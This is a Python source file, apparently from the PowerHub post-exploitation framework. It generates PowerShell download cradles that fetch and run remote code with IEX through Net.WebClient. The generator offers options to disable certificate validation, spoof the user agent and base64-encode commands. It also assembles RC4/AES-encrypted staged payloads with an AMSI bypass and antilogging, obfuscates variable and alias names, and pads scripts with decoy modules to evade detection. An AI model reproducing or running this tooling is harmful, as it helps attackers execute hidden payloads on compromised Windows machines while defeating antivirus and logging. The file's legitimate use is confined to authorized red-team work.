import base64
import binascii
import logging
import os
import random
import re
import string

from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key, Memoize
from powerhub.modules import sanitize_ps1
from powerhub.directories import directories


log = logging.getLogger(__name__)

symbol_list = {None: None}
VARLIST = []


@Memoize
def get_stager_increments():
    """Return number of sections in stage 1"""

    filename = os.path.join(
        directories.BASE_DIR,
        'templates',
        'powershell',
        'stage1.ps1',
    )

    with open(filename, 'r') as fp:
        content = fp.read()

    result = len(content.split('{{separator}}'))
    return result


def build_cradle_https(params):
    result = ''

    if params['transport'] == 'https':
        if params['verification'] == 'noverification':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif params['verification'] == 'fingerprint':
            from powerhub.reverseproxy import FINGERPRINT
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif params['verification'] == 'certstore':
            pass
        if params['tlsv1.2']:
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    return result


def build_cradle_webclient(params, key, callback_urls, incremental=False):
    web_client = symbol_name('web_client', natural=params['natural'])

    result = "$%(web_client)s=New-Object Net.WebClient;"

    if params['proxy']:
        result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                   "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                   "DefaultCredentials;")

    if params['useragent']:
        result += (
            "$%(web_client)s.Headers['User-Agent']="
            "'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';"
        )

    url = callback_urls[params['transport']]

    query = '?'
    for p in params.parameters:
        if p.get_arg:
            query += p.as_query_fragment()
    query = query.replace('?&', '?')

    if query.endswith('?'):
        query = query[:-1]

    # If the query is empty (i.e. all parameters are set to their default
    # values), then it's not necessary to encrypt it. However, if
    # incremental delivery is selected, this would break the syntax, so we
    # need a non-empty encrypted query. Otherwise, paths like '//1, '//2',
    # etc would be requested which would lead to the non-hidden flask app,
    # resulting in 404
    if query or incremental:
        # encrypt url
        query = encrypt_aes(query, key)
        # Make b64 encoding urlsafe
        query = query.replace('/', '_').replace('+', '-')

    downloader = "IEX $%(web_client)s.DownloadString('%(url)s%(query)s'%(extra)s)"

    if incremental:
        result += "(0..%(increments)s)|%%%%{" + downloader + "}"
        # quadruple `%`, because we need to format that string a
        # second time later
        query += '/'
        extra = '+$_'
        increments = get_stager_increments() - 1  # -1 cause we start at 0
    else:
        result += downloader
        extra = ''
        increments = 0

    result = result % dict(
        url=url,
        query=query,
        extra=extra,
        web_client=web_client,
        increments=increments,
    )

    return result


def build_cradle(params, key, callback_urls):
    """Build the download cradle given a dict of GET arguments"""
    log.debug("Building cradle with these parameters: %s" % params)

    result = ""
    natural = params['natural']
    key_var = symbol_name('global_key', natural=natural)

    result += build_cradle_https(params)

    if params['kex'] == 'oob' and key:
        result += "$%(key_var)s='%(key)s';"

    if params['transport'].startswith('http'):
        result += build_cradle_webclient(
            params, key, callback_urls, incremental=params['incremental']
        )

    result = result % dict(
        url=callback_urls[params['transport']],
        transport=params['transport'],
        amsi=params['amsi'],
        key_var=key_var,
        key=key,
    )

    if params['split_cradle']:
        store_dl = symbol_name('store_dl', natural=params['natural'])
        result = result.replace("IEX ", "")
        # Replace last semicolon
        result = result.split(';')
        result[-1] = ('$%s=' % store_dl) + result[-1]
        result = ';'.join(result)
        result = "# First execute this<br/>" + result
        result += "<br/><br/># Then this<br/>" + ("$%s|IEX" % store_dl)

    # make sure to only use single quotes
    assert '"' not in result

    powershell_exe = 'powershell.exe'

    if params['launcher'] == 'cmd':
        result = '%s "%s"' % (powershell_exe, result)
    elif params['launcher'] == 'cmd_enc':
        result = '%s -Enc %s' % (
            powershell_exe,
            binascii.b2a_base64(result.encode('utf-16le')).decode())
    elif params['launcher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"%s \\\"%s\\\""' % (powershell_exe, result)

    return result


def symbol_name(name, natural=False, seed=None, debug=False):
    """Choose an obfuscated symbol name for a given name. Uniqueness
    guaranteed.

    The random seed can be specified so that chosen variables can stay
    constant across sessions; in particular those appearing in the download
    cradle.

    If natural=True, choose a name that is typically used in scripts.

    If debug=True, the new symbol name is equal to the old symbol name.
    """

    # this is done so the symbol_name will be refreshed when getting the
    # natural symbol_name of an already used (non-natural) variable.
    if natural:
        name = name + '_natural'

    if seed:
        temp_random = random.Random(seed + name)
    else:
        temp_random = random

    if name not in symbol_list:
        if debug:
            # In debug mode, don't obfuscate
            symbol_list[name] = name
        else:
            if natural:
                symbol_list[name] = choose_natural_name(temp_random)
            else:
                symbol_list[name] = choose_random_name(temp_random)

    return symbol_list[name]


def choose_natural_name(random):
    if not VARLIST:
        with open(os.path.join(directories.BASE_DIR, 'variables.txt'), 'r') as fp:
            for line in fp:
                if not line.startswith('#'):
                    VARLIST.append(line.strip())

    result = None
    while not result or result in list(symbol_list.values()):
        result = random.choice(VARLIST)

    return result


def choose_random_name(random):
    result = None
    length = random.choice(range(4, 8))
    while not result or result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


def debug_filter(msg, dbg=False):
    """This is a function for debugging statements in jinja2 templates"""
    if dbg:
        return msg + ";"
    return ""


def load_and_encrypt_template(env, key, filename, context):
    template = env.get_template(os.path.join('powershell', filename))
    result = template.render(**context)
    result = encrypt_rc4(result.encode(), key)
    result = base64.b64encode(result).decode()
    return result


def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
              debug=False, natural=False, remove_whitespace=True):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    def rc4byteencrypt(data):
        """This is a function for encrypting bytes in jinja2 templates

        data must be hexascii encoded.
        """
        encrypted = encrypt_rc4(base64.b64encode(binascii.unhexlify(data)), key)
        return base64.b64encode(encrypted).decode()

    env.filters['rc4encrypt'] = rc4encrypt
    env.filters['rc4byteencrypt'] = rc4byteencrypt
    env.filters['debug'] = lambda msg: debug_filter(msg, dbg=debug)
    env.globals['symbol_name'] = lambda name: symbol_name(name, natural=natural, debug=debug)
    env.globals['set_alias'] = obfuscate_set_alias

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))
    antilogging = load_and_encrypt_template(env, key, 'antilogging.ps1', context)
    stage2 = load_and_encrypt_template(env, key, 'stage2.ps1', context)

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t

        if buffer:
            if context.get('slow_encryption'):
                buffer = encrypt_rc4(buffer, key)
            else:
                buffer = encrypt_aes(buffer, key)
            stage3.append(buffer)

    context['antilogging'] = antilogging
    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    if remove_whitespace and not debug:
        result = remove_leading_whitespace(result)
        result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result


def wrap_in_ps1(code, name):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))
    template = env.get_template(os.path.join('powershell', 'exec_dotnet.ps1'))

    code = base64.b64encode(code).decode()
    result = template.render(code=code, name=name)
    return result


def obfuscate_file(fp_in, fp_out, natural=False, debug=False, decoy=False,
                   slow_encryption=False, epilogue='', name=None):
    import magic

    code = fp_in.read()

    try:
        code = code.decode()
        file_type = magic.from_buffer(code)
        code = sanitize_ps1(code, file_type)
    except UnicodeError:
        # It's a binary, assume .NET
        if not name:
            name = os.path.basename(fp_in.name)
            if name == '<stdin>':
                # it is a stream, not a file
                name = symbol_name('power-obfuscate', natural=natural)
                log.warning(
                    "Reading from stdin; since you did not specify a name: the code can be called with '%s'" % name
                )
        code = wrap_in_ps1(code, name)

    stage3 = [code]
    if epilogue:
        stage3.append(epilogue)

    key = generate_random_key(16)

    if decoy:
        separator = '<#%s#>' % ''.join(random.choices(string.ascii_letters, k=32))
    else:
        separator = ''

    amsi_bypass = 'reflection'
    amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
    stager_context = dict(
        kex='embedded',
        key=key,
        amsibypass=amsi_bypass,
        separator=separator,
        slow_encryption=slow_encryption,
    )

    output = get_stage(
        key,
        stage3_strings=stage3,
        context=stager_context,
        debug=debug,
        natural=natural,
        remove_whitespace=(not decoy),
    )

    if decoy:
        output = insert_decoys(output, separator)

    output = output.replace(separator, '')

    fp_out.write(output)

    outfile = fp_out.name

    if outfile == '<stdout>':
        outfile = '<ps1 script>'
    log.info("Output written to %s" % fp_out.name)
    log.info(
        "Execute the file with 'cat %(outfile)s|iex' or 'ipmo %(outfile)s' on the target"
        % dict(outfile=outfile)
    )


def obfuscate_set_alias():
    """Return an obfuscated version of the string `Set-Alias`"""

    # These chars (case sensitive) have special meanings when pre-fixed with `
    special_chars = '0abefnrtuv"\''

    cmd = random.choice(["sal", "Set-Alias"])

    # Randomize capitalization
    temp = ''
    for x in cmd.lower():
        if random.choice([True, False]):
            temp += x
        else:
            temp += x.upper()
    cmd = temp

    # Insert random quotes
    result = cmd[0]
    for i, e in enumerate(cmd[1:]):
        if random.choice([True, False]):
            result += '""'
        if random.choice([True, False]):
            result += "''"
        if random.choice([True, False]) and e not in special_chars:
            result += "`"
        result += e

    return result


def insert_decoys(code, separator):
    """Insert decoy code at positions marked by the separator

    First, split the code at the separators. Then append and prepend 1-2 legit modules
    to each segment. Finally, join the segments.
    """

    decoy_dir = os.path.join(directories.BASE_DIR, 'decoy')
    decoy_list = [f for f in os.listdir(decoy_dir)
                  if (os.path.isfile(os.path.join(decoy_dir, f)) and '.ps' in f)]

    segments = code.split(separator)

    def load_decoy_code(filename):
        full_path = os.path.join(directories.BASE_DIR, 'decoy', filename)
        return open(full_path, 'r').read()

    for i, s in enumerate(segments):
        # append
        samples = draw_samples(decoy_list, 1, 2)
        for x in samples:
            segments[i] += '\n'*random.randrange(1, 5) + load_decoy_code(x)
        # prepend
        samples = draw_samples(decoy_list, 1, 2)
        for x in samples:
            segments[i] = '\n'*random.randrange(1, 5) + load_decoy_code(x) + segments[i]

    result = ("\n\n%s\n\n" % separator).join(segments)

    # Include the LICENSE to be sure:
    license = open(os.path.join(directories.BASE_DIR, 'decoy', 'LICENSE'), 'r').read()
    result = '<#\n%s\n#>%s\n\n' % (license, result)

    return result


def draw_samples(lst, a, b):
    """Select between a und b random samples from a list and remove them"""
    k = random.randrange(a, b+1)
    result = random.sample(lst, k)
    for each in result:
        lst.remove(each)
    return result
